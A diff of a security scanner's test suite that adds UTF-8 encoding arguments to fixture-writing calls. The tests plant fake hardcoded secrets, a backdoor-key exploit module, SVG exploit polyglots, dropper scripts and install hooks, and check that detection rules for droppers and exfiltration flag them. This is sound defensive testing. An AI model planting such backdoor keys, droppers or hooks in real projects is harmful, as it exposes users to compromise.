         assert "SECRET.GENERIC.ASSIGNMENT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
@@ -9703,7 +9812,8 @@ class TestGrafanasDefaultSecretKey:
         """The control, and the whole point of Grafana's advisor: the value matters
         because it is the one nobody changed."""
         (tmp_path / "grafana.ini").write_text(
-            "secret_key = " + Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE") + "\n"
+            "secret_key = " + Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE") + "\n",
+            encoding="utf-8",
         )
         assert "SECRET.GENERIC.ASSIGNMENT.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
@@ -9774,7 +9884,7 @@ class TestAPublishedExploitIsPublishedToBeRun:
             + "\\n-----END RSA PRIVATE KEY-----"
         )
         (module / "eaton_xpert_backdoor.rb").write_text(
-            self.METASPLOIT_HEADER + f'  BACKDOOR_KEY = "{body}".freeze\n'
+            self.METASPLOIT_HEADER + f'  BACKDOOR_KEY = "{body}".freeze\n', encoding="utf-8"
         )
         # Asked at the INFO threshold, because that is where the ceiling puts it and the
         # default threshold would hide the very thing this asserts: the finding is still
@@ -9801,7 +9911,7 @@ class TestAPublishedExploitIsPublishedToBeRun:
             + "\\n".join(["MIIEogIBAAKCAQEA7Qz92LmNb4Rv1Ksd3TfAq2EgHj0Cg5AqB7xQ2mVt9Xb1Np"] * 18)
             + "\\n-----END RSA PRIVATE KEY-----"
         )
-        (tmp_path / "deploy.rb").write_text(f'DEPLOY_KEY = "{body}".freeze\n')
+        (tmp_path / "deploy.rb").write_text(f'DEPLOY_KEY = "{body}".freeze\n', encoding="utf-8")
         assert "SECRET.PRIVATE_KEY.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
@@ -9859,7 +9969,9 @@ class TestAKeyTheSitesOwnPlayerHolds:
         package = tmp_path / "yt_dlp" / "extractor"
         package.mkdir(parents=True)
         value = Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
-        (package / "examplesite.py").write_text(self.EXTRACTOR.format(value=value))
+        (package / "examplesite.py").write_text(
+            self.EXTRACTOR.format(value=value), encoding="utf-8"
+        )
         found = [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -9873,7 +9985,7 @@ class TestAKeyTheSitesOwnPlayerHolds:
         """The control. What grades the extractor is its own declaration; an application
         that hardcodes a key has made no such declaration and can rotate it."""
         value = Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
-        (tmp_path / "client.py").write_text(f"_API_KEY = '{value}'\n")
+        (tmp_path / "client.py").write_text(f"_API_KEY = '{value}'\n", encoding="utf-8")
         assert "SECRET.GENERIC.ASSIGNMENT.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
@@ -9924,7 +10036,7 @@ class TestAWebhookSaysWhatToInspectNotWhatToGrant:
     def _rbac(tmp_path, name: str, body: str) -> list:
         manifests = tmp_path / "manifests"
         manifests.mkdir(exist_ok=True)
-        (manifests / name).write_text(body)
+        (manifests / name).write_text(body, encoding="utf-8")
         return [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -9998,10 +10110,13 @@ class TestAnAuthorTimeHookDoesNotReachAConsumer:
     def _rules(tmp_path, hook: str) -> set[str]:
         scripts = tmp_path / "scripts"
         scripts.mkdir(exist_ok=True)
-        (scripts / "prepare.mjs").write_text(TestAnAuthorTimeHookDoesNotReachAConsumer.SCRIPT)
+        (scripts / "prepare.mjs").write_text(
+            TestAnAuthorTimeHookDoesNotReachAConsumer.SCRIPT, encoding="utf-8"
+        )
         (tmp_path / "package.json").write_text(
             '{ "name": "x", "version": "1.0.0", "scripts": '
-            f'{{ "{hook}": "node scripts/prepare.mjs" }} }}\n'
+            f'{{ "{hook}": "node scripts/prepare.mjs" }} }}\n',
+            encoding="utf-8",
         )
         return ReviewDefectsHelpers.flagged(tmp_path)
 
@@ -10177,7 +10292,7 @@ class TestADirectoryOfPolyglotsIsACollection:
             # wrote the same three files into two directories.
             tag = f"{directory.replace('/', '_')}_{index}"
             (target / f"payload_{index}.jpg").write_text(
-                self.SVG_EXPLOIT.format(width=600 + index, name=tag)
+                self.SVG_EXPLOIT.format(width=600 + index, name=tag), encoding="utf-8"
             )
         return [
             f
@@ -10301,7 +10416,7 @@ class TestTheSameCredentialNameInManyFiles:
             # snippet hash differs and the existing idiom collapse cannot see them.
             value = Support.assemble("aB3kQ9mZ2xT7vF8c", f"H1jL5nP0rS4wY6u{backend[0].upper()}")
             (target / f"{backend}.go").write_text(
-                f'package {backend}\n\nconst (\n\t{name} = "{value}"\n)\n'
+                f'package {backend}\n\nconst (\n\t{name} = "{value}"\n)\n', encoding="utf-8"
             )
         return [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
 
@@ -10327,7 +10442,9 @@ class TestTheSameCredentialNameInManyFiles:
         second = tmp_path / "backend" / "other"
         second.mkdir(parents=True)
         value = Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uZ")
-        (second / "other.go").write_text(f'package other\n\nconst (\n\tapiSecret = "{value}"\n)\n')
+        (second / "other.go").write_text(
+            f'package other\n\nconst (\n\tapiSecret = "{value}"\n)\n', encoding="utf-8"
+        )
         combined = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
         assert len(combined) == 2
         assert any(f.severity >= Severity.HIGH for f in combined), "the odd one out still blocks"
@@ -10420,7 +10537,9 @@ class TestWhichLineTheDropperPointsAt:
         tools = tmp_path / "tools" / "pve"
         tools.mkdir(parents=True)
         for index in range(10):
-            (tools / f"task-{index}.sh").write_text(self.SCRIPT + f'echo "task {index}"\n')
+            (tools / f"task-{index}.sh").write_text(
+                self.SCRIPT + f'echo "task {index}"\n', encoding="utf-8"
+            )
         found = [f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.DROPPER.001"]
         assert len(found) == 1
         assert "appears in 10 files" in found[0].message
@@ -10429,7 +10548,7 @@ class TestWhichLineTheDropperPointsAt:
         """The control. Sourcing a remote file from a branch is a dropper, and one script
         doing it is reported -- at MEDIUM, because a person runs it; see
         `TestFetchAndRunOnRequest` for where the same line blocks."""
-        (tmp_path / "setup.sh").write_text(self.SCRIPT)
+        (tmp_path / "setup.sh").write_text(self.SCRIPT, encoding="utf-8")
         found = [f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.DROPPER.001"]
         assert found
         assert found[0].severity == Severity.MEDIUM
@@ -10498,14 +10617,16 @@ class TestEveryVerbOnOneResourceIsNotEveryResource:
         (extensions / "role-template-tag.yaml").write_text(
             'apiVersion: v1alpha1\nkind: "Role"\nmetadata:\n  name: role-template-manage-tags\n'
             'rules:\n  - apiGroups: ["content.halo.run"]\n    resources: ["tags"]\n'
-            '    verbs: ["*"]\n'
+            '    verbs: ["*"]\n',
+            encoding="utf-8",
         )
         manifests = tmp_path / "manifests" / "cluster-rbac"
         manifests.mkdir(parents=True)
         (manifests / "controller-clusterrole.yaml").write_text(
             "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\n"
             "metadata:\n  name: argocd-application-controller\n"
-            "rules:\n- apiGroups:\n  - '*'\n  resources:\n  - '*'\n  verbs:\n  - '*'\n"
+            "rules:\n- apiGroups:\n  - '*'\n  resources:\n  - '*'\n  verbs:\n  - '*'\n",
+            encoding="utf-8",
         )
         found = [
             f
@@ -10766,7 +10887,8 @@ class TestAskingWhetherASettingIsSetIsNotReadingACredential:
             '    if "WRITE_SALT_VERSION" in os.environ:\n'
             "        self.write_salt_version = True\n"
             '    if "DOWNLOAD_BOOTSTRAP_SCRIPT" in os.environ:\n'
-            '        urlretrieve("https://github.com/saltstack/salt-bootstrap/raw/x", "b.sh")\n'
+            '        urlretrieve("https://github.com/saltstack/salt-bootstrap/raw/x", "b.sh")\n',
+            encoding="utf-8",
         )
         assert not {f for f in ReviewDefectsHelpers.flagged(tmp_path) if "EXFIL" in f}
 
@@ -10799,9 +10921,10 @@ class TestOneObservationIsOneFinding:
 
     def _scan(self, tmp_path):
         (tmp_path / "package.json").write_text(
-            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}'
+            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}',
+            encoding="utf-8",
         )
-        (tmp_path / "install.js").write_text(self.INSTALL_JS)
+        (tmp_path / "install.js").write_text(self.INSTALL_JS, encoding="utf-8")
         return Scanner().scan(tmp_path).findings
 
     def test_the_stronger_rule_is_the_one_reported(self, tmp_path) -> None:
@@ -13214,7 +13337,7 @@ class TestEncodingIsNotDecoding:
 
         text = (
             Path(cordon_scanner.__file__).parent / "rules/builtin/capabilities-python.yaml"
-        ).read_text()
+        ).read_text(encoding="utf-8")
         block = text.split("id: CAP.PY.AST.DECODE.001", 1)[1].split("\n  - id:", 1)[0]
         assert "b64encode" not in block
         assert "b64decode" in block
